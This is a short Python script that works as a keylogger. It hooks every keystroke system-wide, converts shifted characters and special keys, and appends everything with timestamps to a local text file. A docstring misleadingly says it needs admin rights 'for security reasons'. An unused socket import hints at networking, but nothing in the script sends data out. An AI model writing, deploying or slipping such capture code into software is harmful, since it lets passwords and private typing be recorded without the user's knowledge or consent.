#!/usr/bin/env python3

'''
This program must be run as admin for security reasons.
'''

import keyboard, time, os, socket, sys

shift = {
"`" : "~",
"1" : "!",
"2" : "@",
"3" : "#",
"4" : "$",
"5" : "%",
"6" : "^",
"7" : "&",
"8" : "*",
"9" : "(",
"0" : ")",
"-" : "_",
"=" : "+",
"[" : "{",
"]" : "}",
"\\": "|",
";" : ":",
"'" : '"',
"," : "<",
"." : ">",
"/" : "?"
}
replace = {
"enter" : "\n",
"space" : " ",
"delete": "[DELETE]",
"up" : "[UP ARROW]",
"down" : "[DOWN ARROW]",
"left" : "[LEFT ARROW]",
"right": "[RIGHT ARROW]",
"tab" : "[TAB]"
}
ignore = ["None","caps lock","shift"]
tick = 1.0

def key_press(key):
    global tick
    with open("keylog_test.txt", "a") as f:
        if str(key.name) not in ignore:
            if os.stat("keylog_test.txt").st_size == 0 or tick >= 1.0:
                f.write("\n\n\t["+time.asctime()+"]:\n")
            if key.name in replace.keys():
                f.write(str(replace[key.name]))
            elif keyboard.is_pressed(56):
                if key.name in shift.keys():
                    f.write(str(shift[key.name]))
                else:
                    f.write(str(key.name).upper())
            elif keyboard.is_pressed(57):
                f.write(str(key.name).upper())
            else:
                f.write(str(key.name))
        tick = 0.0

keyboard.on_press(key_press)

while True:
    time.sleep(1)
    tick += 0.1
